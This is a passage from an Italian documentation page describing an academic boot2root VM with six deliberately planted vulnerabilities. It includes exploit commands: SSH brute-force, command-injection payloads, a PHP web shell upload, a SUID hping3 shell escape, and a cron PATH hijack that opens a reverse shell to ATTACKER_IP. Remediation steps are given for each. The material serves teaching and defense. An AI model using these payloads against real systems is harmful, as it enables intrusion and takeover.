+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-privilege-escalation-come-diventare-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Privilege Escalation – Come Diventare Root
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. Privilege Escalation – Come Diventare Root">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#41-suid-hping3-easy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.1 SUID hping3 – Easy
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4.1 SUID hping3 – Easy">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cose-hping3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cos'è hping3?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lexploit_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        L'Exploit
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#perche-funziona" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Perché funziona
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#difesa_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Difesa
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#42-cronjob-path-hijacking-medium" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.2 Cronjob PATH Hijacking – Medium
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4.2 Cronjob PATH Hijacking – Medium">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#come-funziona" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Come Funziona
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vulnerability-discovery-phase" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vulnerability Discovery Phase
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-vulnerability-relative-vs-absolute-paths" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The Vulnerability: Relative vs Absolute Paths
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploitation-chain" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploitation Chain
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#remediation-multi-layered" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Remediation (Multi-Layered)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#43-ldso-hijacking-hard" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.3 LD.SO Hijacking – Hard
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4.3 LD.SO Hijacking – Hard">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#come-funziona-lelf-loader" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Come Funziona L'ELF Loader
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#discovery-finding-the-vulnerable-binary" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Discovery: Finding the Vulnerable Binary
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-exploit-creating-malicious-library" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The Exploit: Creating Malicious Library
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#remediation-hardening" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Remediation (Hardening)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-come-ripararlo-strategie-di-defense" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Come Ripararlo – Strategie di Defense
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. Come Ripararlo – Strategie di Defense">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#51-priorita-di-fix" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.1 Priorità di Fix
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#52-la-strategia-di-difesa" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.2 La Strategia Di Difesa
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="boot2root-vm-design-waifu-gallery-artificial-vulnerability-orchestration">Boot2Root VM Design: Waifu Gallery – Artificial Vulnerability Orchestration<a class="headerlink" href="#boot2root-vm-design-waifu-gallery-artificial-vulnerability-orchestration" title="Permanent link">&para;</a></h1>
+<h2 id="progetto-accademico-progettazione-e-implementazione-di-un-ambiente-vulnerabile-controllato">Progetto Accademico: Progettazione e Implementazione di un Ambiente Vulnerabile Controllato<a class="headerlink" href="#progetto-accademico-progettazione-e-implementazione-di-un-ambiente-vulnerabile-controllato" title="Permanent link">&para;</a></h2>
+<p><strong>Contexto del Progetto:</strong>
+- <strong>Ateneo:</strong> Sapienza Università di Roma, Dipartimento di Cybersecurity
+- <strong>Corso:</strong> Ethical Hacking &amp; Penetration Testing (A.A. 2023/24)
+- <strong>Ruolo:</strong> Lead Architect &amp; Full-Stack Developer (6 vulnerabilità, 3 livelli di difficoltà)
+- <strong>Target:</strong> Progettazione di una macchina virtuale vulnerabile destinata a simulazioni didattiche in ambiente d'esame
+- <strong>Deliverable:</strong> VM Linux funzionante + Report tecnico ufficiale + Codice sorgente</p>
+<p><strong>Perché questo progetto è rilevante per la cybersecurity:</strong>
+Gli studenti non dovevano solo trovare vulnerabilità: dovevano capire come combinarle, seguendo il path footprint → access → privilege escalation.</p>
+<p><strong>Tecnologie &amp; Stack:</strong>
+- <strong>Sistema Operativo:</strong> Ubuntu 20.04.6 LTS
+- <strong>Web Stack:</strong> Apache2 + PHP
+- <strong>Backend Logic:</strong> Bash scripting, C (compilazione di exploit)
+- <strong>Vulnerabilità Implementate:</strong> 6 distinte (3 Access Vectors, 3 Privilege Escalation), livelli Easy/Medium/Hard
+- <strong>Infrastructure:</strong> Git versioning per tracking di design decisions</p>
+<hr />
+<h2 id="1-concept-architettura-del-sistema">1. Concept &amp; Architettura del Sistema<a class="headerlink" href="#1-concept-architettura-del-sistema" title="Permanent link">&para;</a></h2>
+<h3 id="11-come-labbiamo-pensata">1.1 Come l'Abbiamo Pensata<a class="headerlink" href="#11-come-labbiamo-pensata" title="Permanent link">&para;</a></h3>
+<p>Abbiamo deciso di non fare il solito "Linux VM con 6 flag nascosti" banale. Volevamo qualcosa che:</p>
+<ol>
+<li><strong>Fosse realistica</strong> – Una web gallery è qualcosa che studenti hanno veramente visto online, non un ambiente astratto</li>
+<li><strong>Avesse una trama</strong> – Il tema anime non è casuale: il prof ama gli anime, quindi è venuto naturale. Ma importante: gli hint sono nella UI (tooltip sulle immagini), quindi per trovarli serve fare OSINT sul sito, non leggere il codice</li>
+<li><strong>Fosse progressivo</strong> – Easy vulnerabilità per capire il flusso, Medium per imparare il bypass che funziona, Hard per chi ha capito bene</li>
+</ol>
+<p><strong>La Scelta: Waifu Gallery</strong>
+Una galleria di personaggi anime di metà 2000. Perché? Perché è credibile (quegli anni c'erano), è un web service che effettivamente è stata una cosa, e gli studenti sapevano già di cosa parlavamo. Non ti devi spiegare "cosa è una gallery", sai già che è un sito dove scrolli immagini.</p>
+<h3 id="12-architettura-dove-abbiamo-messo-cosa">1.2 Architettura: Dove Abbiamo Messo Cosa<a class="headerlink" href="#12-architettura-dove-abbiamo-messo-cosa" title="Permanent link">&para;</a></h3>
+<p>Ogni vulnerabilità doveva stare in un posto specifico del sistema. Così l'attaccante doveva muoversi in ordine:</p>
+<table>
+<thead>
+<tr>
+<th>Componente</th>
+<th>Cosa È</th>
+<th>Dove Attaccare</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Frontend</strong></td>
+<td>Galleria PHP con barra ricerca</td>
+<td>Web Command Injection (search bar)</td>
+</tr>
+<tr>
+<td><strong>Upload nascosto</strong></td>
+<td>imposter.php (non linkato)</td>
+<td>File Upload bypass doppia estensione</td>
+</tr>
+<tr>
+<td><strong>Backend Filters</strong></td>
+<td>Blacklist comandi +regex</td>
+<td>Bypassabile con <code>;;</code> e <code>##</code></td>
+</tr>
+<tr>
+<td><strong>System User</strong></td>
+<td><code>amogus</code> con password <code>sus1</code></td>
+<td>SSH brute-force (nome scopribile da hint UI)</td>
+</tr>
+<tr>
+<td><strong>hping3 SUID</strong></td>
+<td>Binary con bit SUID attivo</td>
+<td>Root shell istantanea</td>
+</tr>
+<tr>
+<td><strong>Cronjob</strong></td>
+<td>Script scrivibile, eseguito come root</td>
+<td>PATH hijacking</td>
+</tr>
+<tr>
+<td><strong>ld.so config</strong></td>
+<td>Libreria in path scrivibile</td>
+<td>Library hijacking + assembly custom</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Progressione pensata:</strong>
+- <strong>Easy:</strong> Scopri l'utente dalla UI =&gt; brute-force SSH =&gt; trovi SUID hping3
+- <strong>Medium:</strong> Bypassa il filtro di ricerca web =&gt; scopri il cronjob, modifichi e aspetti per la root rev. shell
+- <strong>Hard:</strong> Trovi imposter.php e busti il filtro upload =&gt; crei la libreria in C malevola, la sostituisci, hijacki ld.so</p>
+<hr />
+<h2 id="2-vulnerability-landscape-exploitation-chains">2. Vulnerability Landscape &amp; Exploitation Chains<a class="headerlink" href="#2-vulnerability-landscape-exploitation-chains" title="Permanent link">&para;</a></h2>
+<h3 id="21-vulnerability-summary-matrix">2.1 Vulnerability Summary Matrix<a class="headerlink" href="#21-vulnerability-summary-matrix" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Nome Vulnerabilità</th>
+<th>Categoria</th>
+<th>Difficoltà</th>
+<th>Prerequisiti</th>
+<th>Post-Exploitation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>3.1</strong></td>
+<td>Weak SSH Credentials</td>
+<td>Initial Access</td>
+<td>⭐ EASY</td>
+<td>Nessuno (brute-force pubblico)</td>
+<td>Shell utente <code>amogus</code></td>
+</tr>
+<tr>
+<td><strong>3.2</strong></td>
+<td>Web Command Injection</td>
+<td>Lateral Escalation</td>
+<td>⭐⭐ MEDIUM</td>
+<td>Accesso a web app (default)</td>
+<td>RCE come www-data user</td>
+</tr>
+<tr>
+<td><strong>3.3</strong></td>
+<td>File Upload + Shell Execution</td>
+<td>RCE</td>
+<td>⭐⭐⭐ HARD</td>
+<td>Riconoscimento pagina nascosta + upload bypass + esecuzione</td>
+<td>Shell www-data + persistent backdoor</td>
+</tr>
+<tr>
+<td><strong>4.1</strong></td>
+<td>SUID Binary Exploitation (hping3)</td>
+<td>Privilege Escalation</td>
+<td>⭐ EASY</td>
+<td>Shell utente non-root</td>
+<td>Shell root immediata</td>
+</tr>
+<tr>
+<td><strong>4.2</strong></td>
+<td>Insecure Cronjob PATH</td>
+<td>Privilege Escalation</td>
+<td>⭐⭐ MEDIUM</td>
+<td>Accesso utente + attesa timing</td>
+<td>Shell root (da reverse shell)</td>
+</tr>
+<tr>
+<td><strong>4.3</strong></td>
+<td>LD_LIBRARY_PATH Hijacking</td>
+<td>Privilege Escalation</td>
+<td>⭐⭐⭐ HARD</td>
+<td>SUID binary + writable library path + C compilation skills</td>
+<td>Shell root</td>
+</tr>
+</tbody>
+</table>
+<h3 id="22-attack-chain-visualization">2.2 Attack Chain Visualization<a class="headerlink" href="#22-attack-chain-visualization" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>┌─────────────────────────────────────────────────────────┐
+│ INITIAL ACCESS                                          │
+│ ├─ [3.1] SSH brute-force (amogus:sus1)      ← Easiest  │
+│ └─ [3.1] HTTP Reconnaissance → UI hints               │
+└────────────────────┬────────────────────────────────────┘
+                     │
+                     ▼
+┌─────────────────────────────────────────────────────────┐
+│ LATERAL MOVEMENT / WEB RCE                              │
+│ ├─ [3.2] Command Injection via search bar  ← Via ;;##  │
+│ │         shell_exec() bypass                          │
+│ └─ [3.3] Hidden upload page (imposter.php)            │
+│          shell.php.jpg double extension bypass         │
+└────────────────────┬────────────────────────────────────┘
+                     │
+                     ▼
+┌─────────────────────────────────────────────────────────┐
+│ PRIVILEGE ESCALATION (Choose One)                       │
+│ ├─ [4.1] SUID hping3 → /bin/sh -p         ← Simplest   │
+│ ├─ [4.2] Cronjob PATH manipulation                     │
+│ └─ [4.3] LD_LIBRARY_PATH hijacking        ← Complex    │
+└─────────────────────────────────────────────────────────┘
+</code></pre></div>
+<p><strong>Chiave Didattica:</strong>
+Ogni livello dimostra concetti reali riscontrati in engagement professionali:
+- <strong>Easy:</strong> Reconnaissance basica + weak credentials (es. Spring4Shell, ProxyLogon preliminary phases)
+- <strong>Medium:</strong> Sanitizzazione insufficiente + misunderstanding di shell metacharacters
+- <strong>Hard:</strong> Understanding profondo di ELF loader + exploitation of complex privilege boundaries</p>
+<hr />
+<h2 id="3-vulnerabilita-di-accesso-implementazione-personale">3. Vulnerabilità di Accesso (Implementazione Personale)<a class="headerlink" href="#3-vulnerabilita-di-accesso-implementazione-personale" title="Permanent link">&para;</a></h2>
+<p>In questa sezione vengono descritti i vettori di ingresso progettati e implementati per consentire all'attaccante di ottenere il primo accesso al sistema.</p>
+<h3 id="31-weak-ssh-credentials-easy-mode">3.1 Weak SSH Credentials – Easy Mode<a class="headerlink" href="#31-weak-ssh-credentials-easy-mode" title="Permanent link">&para;</a></h3>
+<h4 id="setup">Setup<a class="headerlink" href="#setup" title="Permanent link">&para;</a></h4>
+<p>L'utente <code>amogus</code> con password <code>sus1</code> è il primo indizio. Il nome è un riferimento ad Among Us (il gioco), che all'epoca era famoso nei nostri gruppi di studio. Sapevamo che gli altri studenti lo avrebbero riconosciuto.</p>
+<p>La password non è nella UI da nessuna parte, ma il nome sì: se apri il DevTools e ispezioni una qualunque immagine della gallery, vedi:
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;...&quot;</span> <span class="na">title</span><span class="o">=</span><span class="s">&quot;amogus&quot;</span> <span class="err">...</span><span class="p">&gt;</span>
+</code></pre></div></p>
+<p>Quindi per risolvere questa vulnerabilità serve:
+1. Osservare la UI (aprire inspector del browser)
+2. Identificare il titolo nascosto
+3. Tentare brute-force su SSH con quel nome</p>
+<h4 id="lexploit">L'Exploit<a class="headerlink" href="#lexploit" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="c1"># Reconnaissance: passa il mouse su un&#39;immagine, vedi il tooltip</span>
+<span class="c1"># Oppure F12 → Inspector, cerca title attribute</span>
+
+<span class="c1"># Brute-force SSH</span>
+hydra<span class="w"> </span>-l<span class="w"> </span>amogus<span class="w"> </span>-P<span class="w"> </span>wordlist.txt<span class="w"> </span>ssh://&lt;vm_ip&gt;
+<span class="c1"># Oppure: ssh amogus@&lt;vm_ip&gt; con password &quot;sus1&quot;</span>
+</code></pre></div>
+<p>È Easy perché non c'è logica nascosta: il nome è visibile in UI, la password è banale. L'unico sforzo è capire che vai su SSH, non sul web app.</p>
+<h3 id="32-web-command-injection-medium-mode">3.2 Web Command Injection – Medium Mode<a class="headerlink" href="#32-web-command-injection-medium-mode" title="Permanent link">&para;</a></h3>
+<h4 id="la-vulnerabilita">La Vulnerabilità<a class="headerlink" href="#la-vulnerabilita" title="Permanent link">&para;</a></h4>
+<p>La search bar fa ricerca di immagini con <code>shell_exec("ls $image_folder$query*.jpg")</code>.Il filtro era blacklist-based: blocca bash, nc, wget, comandi specifici. Però abbiamo volutamente lasciato un buco.</p>
+<p>Se usi <code>;</code> o <code>#</code> direttamente, viene bloccato. MA se usi <code>;;</code> e <code>##</code>, il filtro le riconosce come "doppi" e le permette. Poi c'è un <code>str_replace()</code> che li converte in singoli:
+<div class="highlight"><pre><span></span><code><span class="x">if (strpos($query, &quot;;;&quot;) !== false &amp;&amp; strpos($query, &quot;##&quot;) !== false) {</span>
+<span class="x">    $query = str_replace(&quot;;;&quot;, &quot;;&quot;, $query);    // ;; -&gt; ;</span>
+<span class="x">    $query = str_replace(&quot;##&quot;, &quot;#&quot;, $query);    // ## -&gt; #</span>
+<span class="x">}</span>
+</code></pre></div></p>
+<p>Il problema: il controllo PRIMA della sostituzione. Quindi <code>;;ls /##</code> passa il filtro perché <code>;;</code> non è <code>;</code>, non viene bloccato.</p>
+<h4 id="come-risolverla">Come Risolverla<a class="headerlink" href="#come-risolverla" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="c1"># Payload diretti</span>
+<span class="p">;;</span>ls<span class="w"> </span>/##<span class="w">            </span><span class="c1"># Elenca root directory</span>
+<span class="p">;;</span>cat<span class="w"> </span>/etc/passwd##<span class="w">  </span><span class="c1"># Legge file sensibili</span>
+<span class="p">;;</span>whoami##<span class="w">          </span><span class="c1"># Vedi chi sei</span>
+
+<span class="c1"># Payload più complessi (reverse shell):</span>
+<span class="p">;;</span>bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/ATTACKER_IP/7777<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="c1">##</span>
+</code></pre></div>
+<p><strong>Difesa:</strong>
+Non usare <code>shell_exec</code> con input user. O se lo fai:
+1. <strong>Whitelist</strong> – accetta solo caratteri sicuri: <code>preg_replace('/[^a-zA-Z0-9_-]/', '', $query)</code>
+2. <strong>escapeshellarg()</strong> – se proprio devi usare shell_exec: <code>escapeshellarg($query)</code>
+3. <strong>Meglio: PHP native</strong> – <code>glob("images/{$query}*.jpg")</code> senza shell</p>
+<h3 id="33-file-upload-bypass-hard-mode">3.3 File Upload Bypass – Hard Mode<a class="headerlink" href="#33-file-upload-bypass-hard-mode" title="Permanent link">&para;</a></h3>
+<h4 id="lidea">L'Idea<a class="headerlink" href="#lidea" title="Permanent link">&para;</a></h4>
+<p>Abbiamo creato una pagina nascosta <code>imposter.php</code> che non è linkata da nessuna parte. Se la trovi e accedi, puoi uploadare un file.</p>
+<p>Il filtro controlla solo l'estensione finale via <code>pathinfo()</code>. Quindi:
+- <code>shell.php.jpg</code> → estensione = <code>.jpg</code> ✅ passa il filtro
+- Ma il file si salva come <code>shell.php.jpg</code> e se Apache lo esegue come PHP → RCE</p>
+<h4 id="come-la-trovi">Come la Trovi<a class="headerlink" href="#come-la-trovi" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="c1"># 1. Brute force</span>
+gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://&lt;vm_ip&gt;<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/common.txt
+<span class="c1"># Scopri imposter.php</span>
+
+<span class="c1"># 2. O se hai RCE dalla command injection:</span>
+cat<span class="w"> </span>index.php<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;upload\|form\|POST&quot;</span><span class="w">  </span><span class="c1"># Find links to imposter.php</span>
+</code></pre></div>
+<h4 id="lexploit_1">L'Exploit<a class="headerlink" href="#lexploit_1" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="c1"># Crea una web shell</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>shell.php
+
+<span class="c1"># Rinomina con doppia estensione</span>
+mv<span class="w"> </span>shell.php<span class="w"> </span>shell.php.jpg
+
+<span class="c1"># Upload</span>
+curl<span class="w"> </span>-F<span class="w"> </span><span class="s2">&quot;image=@shell.php.jpg&quot;</span><span class="w"> </span>http://&lt;vm_ip&gt;/imposter.php
+
+<span class="c1"># Esegui</span>
+curl<span class="w"> </span><span class="s2">&quot;http://&lt;vm_ip&gt;/images/shell.php.jpg?cmd=id&quot;</span>
+<span class="c1"># uid=33(www-data) ...</span>
+</code></pre></div>
+<h4 id="difesa">Difesa<a class="headerlink" href="#difesa" title="Permanent link">&para;</a></h4>
+<ol>
+<li><strong>Controlla magic bytes</strong> – Non extension. <code>getimagesize()</code> verifica se è davvero un'immagine</li>
+<li><strong>Rinomina il file</strong> - Genera nome random: <code>bin2hex(random_bytes(16)) . ".jpg"</code></li>
+<li><strong>Store outside webroot</strong> - Salva in <code>/var/uploads/</code>, non dove Apache può eseguire</li>
+<li><strong>Disabilita PHP execution</strong> nella cartella upload (.htaccess o web.config)</li>
+</ol>
+<h2 id="4-privilege-escalation-come-diventare-root">4. Privilege Escalation – Come Diventare Root<a class="headerlink" href="#4-privilege-escalation-come-diventare-root" title="Permanent link">&para;</a></h2>
+<h3 id="41-suid-hping3-easy">4.1 SUID hping3 – Easy<a class="headerlink" href="#41-suid-hping3-easy" title="Permanent link">&para;</a></h3>
+<h4 id="cose-hping3">Cos'è hping3?<a class="headerlink" href="#cose-hping3" title="Permanent link">&para;</a></h4>
+<p><code>hping3</code> è un packet crafting tool, simile a <code>ping</code> ma con stereoidi. Si usa per testare firewall, creare pacchetti custom, roba così. NON dovrebbe mai avere SUID.</p>
+<h4 id="lexploit_2">L'Exploit<a class="headerlink" href="#lexploit_2" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="c1"># Enumerare SUID binaries</span>
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>hping
+<span class="c1"># Output: /usr/sbin/hping3</span>
+
+<span class="c1"># Eseguire hping3 (che è SUID root)</span>
+$<span class="w"> </span>/usr/sbin/hping3
+hping3<span class="w"> </span>&gt;<span class="w"> </span>/bin/sh<span class="w"> </span>-p
+
+<span class="c1"># Boom, sei root</span>
+$<span class="w"> </span>whoami
+root
+</code></pre></div>
+<p>La flag <code>-p</code> di <code>/bin/sh</code> è critica: "preserve mode". Senza, la shell droppa i privilegi automaticamente.</p>
+<h4 id="perche-funziona">Perché funziona<a class="headerlink" href="#perche-funziona" title="Permanent link">&para;</a></h4>
+<p><code>hping3</code> con SUID esegue come root. Dentro hping3 c'è una funzionalità di shell escape. Chiedi una shell, e il processo (che è root) te la dà. Easy.</p>
+<h4 id="difesa_1">Difesa<a class="headerlink" href="#difesa_1" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="c1"># Remove SUID</span>
+chmod<span class="w"> </span>-s<span class="w"> </span>/usr/sbin/hping3
+
+<span class="c1"># Oppure usare sudo con logging:</span>
+<span class="c1"># sudoers: amogus ALL=(root) NOPASSWD: /usr/sbin/hping3</span>
+</code></pre></div>
+<h3 id="42-cronjob-path-hijacking-medium">4.2 Cronjob PATH Hijacking – Medium<a class="headerlink" href="#42-cronjob-path-hijacking-medium" title="Permanent link">&para;</a></h3>
+<h4 id="come-funziona">Come Funziona<a class="headerlink" href="#come-funziona" title="Permanent link">&para;</a></h4>
+<p>Cronjob (cron) è un Linux scheduler che esegue scripts periodicamente. Se:
+- Lo script viene eseguito <strong>come root</strong> ma è <strong>scrivibile da non-root</strong>
+- E usa <strong>path relativo</strong> per eseguire comandi</p>
+<p>Allora dirottiamo gli eseguibili aggiungendo una directory fake al PATH dove creiamo eseguibili nostri con lo stesso nome. Quando cron esegue il comando, trova il nostro fake.</p>
+<h4 id="vulnerability-discovery-phase">Vulnerability Discovery Phase<a class="headerlink" href="#vulnerability-discovery-phase" title="Permanent link">&para;</a></h4>
+<p><strong>Step 1: Identify the "overwrite.sh" script</strong>
+<div class="highlight"><pre><span></span><code>find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;overwrite.sh&quot;</span><span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-writable<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+<span class="c1"># Output: /home/developer/overwrite.sh</span>
+<span class="c1"># Permissions: -rw-rw-r-- (writable by non-root!)</span>
+</code></pre></div></p>
+<p><strong>Step 2: Examine the script content</strong>
+<div class="highlight"><pre><span></span><code>cat<span class="w"> </span>/home/developer/overwrite.sh
+<span class="c1"># Output uses RELATIVE paths:</span>
+<span class="c1"># ls /          (instead of: /bin/ls /)</span>
+<span class="c1"># whoami        (instead of: /usr/bin/whoami)</span>
+<span class="c1"># id            (instead of: /usr/bin/id)</span>
+</code></pre></div></p>
+<h4 id="the-vulnerability-relative-vs-absolute-paths">The Vulnerability: Relative vs Absolute Paths<a class="headerlink" href="#the-vulnerability-relative-vs-absolute-paths" title="Permanent link">&para;</a></h4>
+<p><strong>How PATH hijacking works:</strong>
+When cron executes the script with PATH like <code>/home/developer:/usr/bin:/bin</code>:
+<div class="highlight"><pre><span></span><code>When script executes: ls
+System searches:
+1. /home/developer/ls        ← Attacker CREATES THIS
+2. /usr/bin/ls
+3. /bin/ls
+
+Result: Attacker&#39;s malicious /home/developer/ls executes as root!
+</code></pre></div></p>
+<h4 id="exploitation-chain">Exploitation Chain<a class="headerlink" href="#exploitation-chain" title="Permanent link">&para;</a></h4>
+<p><strong>Step 1: Create malicious executable</strong>
+<div class="highlight"><pre><span></span><code>cat<span class="w"> </span>&gt;<span class="w"> </span>/home/developer/ls<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39;</span>
+<span class="s">#!/bin/bash</span>
+<span class="s"># This will execute as ROOT because cron runs as root!</span>
+<span class="s">bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/7777 0&gt;&amp;1</span>
+<span class="s">EOF</span>
+chmod<span class="w"> </span>+x<span class="w"> </span>/home/developer/ls
+</code></pre></div></p>
+<p><strong>Step 2: Set up listener</strong>
+<div class="highlight"><pre><span></span><code>nc<span class="w"> </span>-lnvp<span class="w"> </span><span class="m">7777</span>
+<span class="c1"># Waiting for reverse shell...</span>
+</code></pre></div></p>
+<p><strong>Step 3: Wait for cron execution</strong>
+<div class="highlight"><pre><span></span><code><span class="c1"># Cron will execute overwrite.sh at scheduled time (e.g., every minute)</span>
+<span class="c1"># When it runs &quot;ls /&quot; inside the script:</span>
+<span class="c1"># It looks for &quot;ls&quot; in PATH</span>
+<span class="c1"># Finds /home/developer/ls</span>
+<span class="c1"># Executes OUR malicious script as root</span>
+</code></pre></div></p>
+<p><strong>Step 4: Get root shell</strong>
+<div class="highlight"><pre><span></span><code>root@vm:/#<span class="w"> </span>id
+<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>
+</code></pre></div></p>
+<h4 id="remediation-multi-layered">Remediation (Multi-Layered)<a class="headerlink" href="#remediation-multi-layered" title="Permanent link">&para;</a></h4>
+<p><strong>Layer 1: Use absolute paths in scripts (PRIMARY)</strong>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+<span class="c1"># SECURE: All paths are absolute</span>
+/bin/ls<span class="w"> </span>/
+/usr/bin/whoami
+/usr/bin/id
+/bin/cat<span class="w"> </span>/etc/passwd
+</code></pre></div></p>
+<p><strong>Layer 2: Set restrictive PATH in cronjob</strong>
+<div class="highlight"><pre><span></span><code># In /etc/cron.d/example:
+PATH=/bin:/usr/bin
+SHELL=/bin/bash
+* * * * * root /home/developer/overwrite.sh &gt; /dev/null 2&gt;&amp;1
+</code></pre></div></p>
+<p><strong>Layer 3: Make scripts non-writable by non-root</strong>
+<div class="highlight"><pre><span></span><code>chmod<span class="w"> </span><span class="m">750</span><span class="w"> </span>/home/developer/overwrite.sh
+<span class="c1"># Now only owner (root) and group can modify</span>
+</code></pre></div></p>
+<h3 id="43-ldso-hijacking-hard">4.3 LD.SO Hijacking – Hard<a class="headerlink" href="#43-ldso-hijacking-hard" title="Permanent link">&para;</a></h3>
+<h4 id="come-funziona-lelf-loader">Come Funziona L'ELF Loader<a class="headerlink" href="#come-funziona-lelf-loader" title="Permanent link">&para;</a></h4>
+<p>L'ELF loader (<code>ld.so</code>) risolve le librerie dinamiche che un programma ha bisogno al runtime. Segue un ordine di ricerca specifico:</p>
+<div class="highlight"><pre><span></span><code>1. LD_LIBRARY_PATH (variabile ambiente)
+2. /etc/ld.so.cache (cache compilata)
+3. /etc/ld.so.conf e /etc/ld.so.conf.d/ (config di sistema)
+4. Standard dirs: /lib, /usr/lib, /lib64, /usr/lib64
+</code></pre></div>
+<p>Se un binary SUID cerca una libreria in una directory <strong>scrivibile</strong>, possiamo mettere lì la nostra versione malware e il binary SUID la carica.</p>
